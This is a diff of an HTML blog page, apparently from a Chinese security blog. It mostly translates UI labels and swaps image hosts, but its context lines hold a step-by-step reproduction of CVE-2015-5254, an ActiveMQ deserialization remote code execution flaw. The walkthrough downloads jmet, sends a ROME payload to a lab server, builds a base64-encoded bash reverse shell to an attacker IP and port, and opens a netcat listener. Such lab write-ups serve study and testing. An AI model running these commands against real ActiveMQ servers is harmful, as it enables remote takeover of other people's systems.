@@ -131,12 +131,12 @@
   <article id="post">
     <h1>漏洞复现（CVE-2015-5254）</h1>
     <p class="page-title-sub">
-      <span id="post-title-date">撰写于 2019-07-20</span>
+      <span id="post-title-date">Created at 2019-07-20</span>
       
-        <span id="post-title-updated">修改于 2019-08-02</span>
+        <span id="post-title-updated">Updated at 2019-08-03</span>
       
       
-      <span id="post-title-categories">分类
+      <span id="post-title-categories">Category
       
       
         
@@ -147,7 +147,7 @@
       
       
       <span id="post-title-tags">
-      标签
+      Tag
       
       
         
@@ -172,28 +172,28 @@
 <li>使用jmet的jar文件（ysoserial就是一个反序列化的工具，而使用这个工具需要下载jmet文件），并在同目录下创建external文件夹（否则会报错）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>&emsp;<br>cd /opt<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br>&emsp;<br>&emsp;</li>
 <li>执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/lpp” -Yp ROME   192.168.199.120   61616</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/271141d89559826e461b6e9d46f7f12f/xmlnote/WEBRESOURCEef58fcb07b85c5cc30ea383103793dcb/10117" alt><br>可以看到生成了一个ID：ID:lpp-44031-1563247648863-0:1<br>&emsp;<br>&emsp;</p>
+<p><img src="https://imgchr.com/i/eB50gJ" alt><br>可以看到生成了一个ID：ID:lpp-44031-1563247648863-0:1<br>&emsp;<br>&emsp;</p>
 <ol start="3">
 <li>在受害者的主机上创建/tmp/lpp文件</li>
 </ol>
 <p>-Q指定队列消息名，-I指定JMS客户端，这里是ActiveMQ，-Y指定具体的命令，-Yp指定payload类型，其后分别是ActiveMQ所在机器的ip及工作端口<br>所以这条命令是使用ROME payload把 执行 touch /success 命令序列化后作为名为l3yx的消息发送给ActiveMQ<br>&emsp;<br>进web页面访问下面的网址（账户密码都是admin）<br><a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event</a><br>找到上面对应的ID</p>
-<p><img src="https://note.youdao.com/yws/public/resource/271141d89559826e461b6e9d46f7f12f/xmlnote/WEBRESOURCEb4c07e7b66ce597ac0c7d3bb214797ff/10125" alt><br>找到所对应的ID，点击进去触发。</p>
-<p><img src="https://note.youdao.com/yws/public/resource/271141d89559826e461b6e9d46f7f12f/xmlnote/WEBRESOURCE5503b8101525694bc5c9fe19b2f19fff/10128" alt><br>&emsp;<br>&emsp;</p>
+<p><img src="https://imgchr.com/i/eB5cE6" alt><br>找到所对应的ID，点击进去触发。</p>
+<p><img src="https://imgchr.com/i/eB5WCD" alt><br>&emsp;<br>&emsp;</p>
 <ol start="4">
 <li>使用反弹shell命令<br>利用方式很简单，只要将命令换为反弹shell即可<br>bash -i &gt;&amp; /dev/tcp/攻击机IP/监听端口 0&gt;&amp;1（payload）<br>&emsp;<br>不过在这里需要绕过Java的机制，可以把反弹 shell的命令base64进行编码<br>bash -c {echo,payload的basse64编码}|{base64,-d}|{bash,-i}<br>&emsp;<br>最终执行的是以下部分<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTk5LjE4Ny8xMzE0IDA+JjE=}|{base64,-d}|{bash,-i}” -Yp ROME   192.168.199.120   61616</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/271141d89559826e461b6e9d46f7f12f/xmlnote/WEBRESOURCEabfedba1eb6cbebb051998cd9294ea2c/10166" alt><br>&emsp;<br>&emsp;</p>
+<p><img src="https://imgchr.com/i/eB54vd" alt><br>&emsp;<br>&emsp;</p>
 <ol start="5">
 <li>监听端口<br>再使用nc -lp 1314进行监听<br>这时再在页面上找到上图对应的ID，触发它即可。</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/271141d89559826e461b6e9d46f7f12f/xmlnote/WEBRESOURCE8c2c1e2a6a789ab823eda0a30e5ad37a/10180" alt><br>即拿到shell</p>
+<p><img src="https://imgchr.com/i/eB5Tbt" alt><br>即拿到shell</p>
 
   </article>
   <div class="random-toc-area">
-  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
-  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">Show TOC</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
   <div class="random-toc">
-    <h2>目录</h2>
+    <h2>Table of Content</h2>
     <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol>
   </div>
 </div>
@@ -201,13 +201,13 @@
   
 <nav id="pagination">
   
-    <a href="/2019/07/21/1 day/5/" class="prev">&larr; 上一篇 nginx文件解析漏洞</a>
+    <a href="/2019/07/21/1 day/5/" class="prev">&larr; Prev post nginx文件解析漏洞</a>
   
 
   
 
   
-    <a href="/2019/07/20/1 day/2/" class="next">下一篇 CouchDB 未授权访问漏洞CVE-2017-12635 &rarr;</a>
+    <a href="/2019/07/20/1 day/2/" class="next">Next post CouchDB 未授权访问漏洞CVE-2017-12635 &rarr;</a>
   
 </nav>
 
